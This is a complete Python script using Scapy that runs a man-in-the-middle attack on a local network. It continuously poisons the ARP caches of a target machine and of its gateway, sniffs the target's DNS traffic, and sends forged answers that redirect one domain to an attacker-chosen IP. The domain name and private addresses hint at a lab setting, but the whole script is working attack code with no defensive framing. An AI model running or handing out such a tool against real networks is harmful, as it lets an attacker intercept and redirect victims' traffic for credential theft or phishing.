import time
import threading
from scapy.all import ARP, Ether, sendp, IP, UDP, DNS, DNSQR, DNSRR, sniff, send

# Configuration
target_ip = "192.168.1.234"
gateway_ip = "192.168.1.254"
my_real_mac = "60:ff:9e:0c:29:af"
spoof_domain = "domaine_test.qls"
fake_ip = "192.168.1.74"

def arp_spoof():
    """Maintains the MITM position by poisoning the target's ARP cache."""
    # Poison target: Gateway IP is at My MAC
    target_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2, psrc=gateway_ip, hwsrc=my_real_mac, pdst=target_ip
    )
    # Poison gateway: Target IP is at My MAC
    gateway_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2, psrc=target_ip, hwsrc=my_real_mac, pdst=gateway_ip
    )
    
    print(f"[*] Starting ARP spoofing: {target_ip} <-> {gateway_ip}")
    while True:
        sendp(target_packet, count=1, verbose=False)
        sendp(gateway_packet, count=1, verbose=False)
        time.sleep(2)

def dns_spoof(pkt):
    """Intercepts DNS queries and sends forged responses."""
    if pkt.haslayer(DNSQR) and spoof_domain in pkt[DNS].qd.qname.decode():
        print(f"[!] Intercepted DNS query for {spoof_domain}")
        
        # Craft the DNS response
        # IP layer: Swap src and dst
        # UDP layer: Swap sport and dport
        # DNS layer: Set qr=1 (response), aa=1 (authoritative), and add the answer (DNSRR)
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=fake_ip))
        
        send(spoofed_pkt, verbose=False)
        print(f"[+] Sent spoofed DNS response: {spoof_domain} -> {fake_ip}")

def main():
    # Start ARP spoofing in a background thread
    arp_thread = threading.Thread(target=arp_spoof, daemon=True)
    arp_thread.start()
    
    print(f"[*] Sniffing for DNS queries for {spoof_domain}...")
    try:
        # Sniff UDP port 53 (DNS) queries coming from the target IP
        sniff_filter = f"udp port 53 and host {target_ip}"
        sniff(filter=sniff_filter, prn=dns_spoof, store=0)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")

if __name__ == "__main__":
    main()
